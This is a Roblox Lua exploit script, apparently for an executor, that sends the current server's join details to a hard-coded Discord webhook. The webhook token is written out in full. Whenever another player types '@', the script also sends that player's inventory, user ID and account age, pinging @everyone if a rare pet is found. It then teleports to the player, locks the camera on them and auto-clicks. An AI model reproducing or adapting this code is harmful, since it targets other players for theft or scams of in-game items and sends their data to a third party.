local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- Webhook URL (replace with yours)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"

-- Rare pets list
local RARE_PETS = {
    "T-Rex", "Dragonfly", "Raccoon", 
    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
}

-- First send server info to Discord
local function sendServerInfo()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    local teleportScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")',
        placeId, jobId
    )
    
    local embed = {
        title = "Server Info - Roqate 2025",
        description = "Join using the script above",
        color = 0x00FF00,
        fields = {
            {
                name = "Player Count",
                value = tostring(#Players:GetPlayers()),
                inline = true
            },
            {
                name = "Place ID",
                value = tostring(placeId),
                inline = true
            }
        }
    }
    
    local payload = {
        content = teleportScript,
        embeds = {embed}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

-- Send player info when they say @
local function sendPlayerInfo(player)
    local items = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _,item in pairs(backpack:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    
    local hasRare = false
    for _,pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            hasRare = true
            break
        end
    end
    
    local embed = {
        title = "Player Triggered - "..player.Name,
        description = table.concat(items, "\n"),
        color = hasRare and 0xFF0000 or 0x0000FF,
        fields = {
            {
                name = "User ID",
                value = tostring(player.UserId),
                inline = true
            },
            {
                name = "Account Age",
                value = tostring(player.AccountAge),
                inline = true
            }
        }
    }
    
    local payload = {
        content = hasRare and "@everyone" or nil,
        embeds = {embed}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

-- Teleport and interact with player
local function teleportToPlayer(target)
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local root = char:WaitForChild("HumanoidRootPart")
    local humanoid = char:WaitForChild("Humanoid")
    
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local targetTorso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
    local targetHead = targetChar:WaitForChild("Head")
    
    -- Teleport to 4 studs away
    root.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
    
    -- Force first person
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    -- Force look at head
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetHead.Position)
    end)
    
    -- Auto click after delay
    task.wait(0.5)
    mouse1click()
    
    -- Cleanup after 5 seconds
    task.wait(5)
    if lookConn then lookConn:Disconnect() end
end

-- Handle chat messages
local function onChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end
    
    -- First send player info to Discord
    sendPlayerInfo(player)
    
    -- Then teleport to them
    teleportToPlayer(player)
end

-- Initial setup
sendServerInfo() -- Send server info immediately

-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onChatted(player, msg)
    end)
end)

print("Script loaded - Server info sent to Discord")
